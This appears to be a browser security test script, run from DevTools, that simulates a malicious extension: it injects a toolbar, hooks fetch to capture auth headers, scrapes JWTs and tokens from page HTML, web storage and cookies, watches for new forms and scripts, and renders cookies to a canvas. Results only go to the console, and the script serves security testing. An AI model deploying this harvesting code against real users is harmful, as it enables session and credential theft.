// =============================================================
// TEST 09: Extension-Like Behavior from DevTools
// =============================================================
// Simulates what a malicious browser extension could do

// --- Test 9.1: Content script injection (DOM manipulation) ---
// Add a toolbar to every page
var toolbar = document.createElement('div');
toolbar.id = 'zt-toolbar';
toolbar.innerHTML = `
<div style="position:fixed;top:0;left:0;right:0;background:#1a1a2e;color:#0f0;padding:8px 15px;z-index:999999;font-family:monospace;font-size:12px;display:flex;justify-content:space-between;align-items:center;">
    <span>[ZT-Test] DevTools Extension Simulation Active</span>
    <span id="zt-status">Monitoring...</span>
</div>`;
document.body.appendChild(toolbar);
document.body.style.marginTop = '35px';
console.log('[TEST 9.1] Extension toolbar injected');

// --- Test 9.2: Request interceptor (like webRequest API) ---
// Already covered in test 06 but specifically for auth headers
var origFetch2 = window.fetch;
window.fetch = async function(...args) {
    var response = await origFetch2.apply(this, args);
    // Clone to read headers without consuming
    var clone = response.clone();
    var authHeaders = {};
    clone.headers.forEach(function(v, k) {
        if (k.toLowerCase().includes('auth') || k.toLowerCase().includes('token') || k.toLowerCase().includes('session')) {
            authHeaders[k] = v;
        }
    });
    if (Object.keys(authHeaders).length > 0) {
        console.log('[TEST 9.2] AUTH HEADERS CAPTURED:', JSON.stringify(authHeaders));
        document.getElementById('zt-status').textContent = 'Auth header captured!';
    }
    return response;
};
console.log('[TEST 9.2] Auth header interceptor active');

// --- Test 9.3: Token/JWT extraction ---
(function() {
    // Search page content for JWTs
    var jwtRegex = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g;
    var pageContent = document.documentElement.innerHTML;
    var jwts = pageContent.match(jwtRegex);
    if (jwts) {
        console.log('[TEST 9.3] JWTs FOUND IN PAGE:', jwts.length);
        jwts.forEach(function(jwt) {
            try {
                var payload = JSON.parse(atob(jwt.split('.')[1]));
                console.log('[TEST 9.3] JWT payload:', JSON.stringify(payload));
            } catch(e) {}
        });
    } else {
        console.log('[TEST 9.3] No JWTs found in page HTML');
    }

    // Search localStorage/sessionStorage for tokens
    [localStorage, sessionStorage].forEach(function(storage, idx) {
        var name = idx === 0 ? 'localStorage' : 'sessionStorage';
        for (var i = 0; i < storage.length; i++) {
            var key = storage.key(i);
            var val = storage.getItem(key);
            if (key.match(/token|auth|jwt|session|key|secret/i) || (val && val.match(jwtRegex))) {
                console.log('[TEST 9.3] TOKEN in ' + name + ':', key, '=', val.substring(0, 100));
            }
        }
    });

    // Search cookies for tokens
    document.cookie.split(';').forEach(function(c) {
        var parts = c.trim().split('=');
        if (parts[0].match(/token|auth|jwt|session|sid|key/i)) {
            console.log('[TEST 9.3] TOKEN in cookie:', parts[0], '=', parts.slice(1).join('=').substring(0, 100));
        }
    });
})();

// --- Test 9.4: MutationObserver for dynamic content ---
var contentObserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(m) {
        // Watch for dynamically added forms
        m.addedNodes.forEach(function(n) {
            if (n.tagName === 'FORM' || (n.querySelectorAll && n.querySelectorAll('form').length > 0)) {
                console.log('[TEST 9.4] NEW FORM DETECTED:', n.tagName, n.action || '');
            }
            // Watch for added scripts
            if (n.tagName === 'SCRIPT') {
                console.log('[TEST 9.4] NEW SCRIPT:', n.src || '(inline)');
            }
        });
    });
});
contentObserver.observe(document.body, {childList: true, subtree: true});
console.log('[TEST 9.4] DOM mutation observer active');

// --- Test 9.5: Screenshot simulation (canvas capture) ---
try {
    // html2canvas would be needed for full page — simulate with canvas
    var canvas = document.createElement('canvas');
    canvas.width = 400; canvas.height = 300;
    var ctx = canvas.getContext('2d');
    ctx.fillStyle = '#fff';
    ctx.fillRect(0, 0, 400, 300);
    ctx.fillStyle = '#000';
    ctx.font = '14px monospace';
    ctx.fillText('Page: ' + document.title, 10, 20);
    ctx.fillText('URL: ' + location.href.substring(0, 50), 10, 40);
    ctx.fillText('Cookies: ' + document.cookie.substring(0, 50), 10, 60);
    var dataUrl = canvas.toDataURL('image/png');
    console.log('[TEST 9.5] Canvas screenshot created:', dataUrl.substring(0, 80) + '...');
    // Could exfiltrate this
} catch(e) { console.log('[TEST 9.5] Canvas BLOCKED:', e.message); }
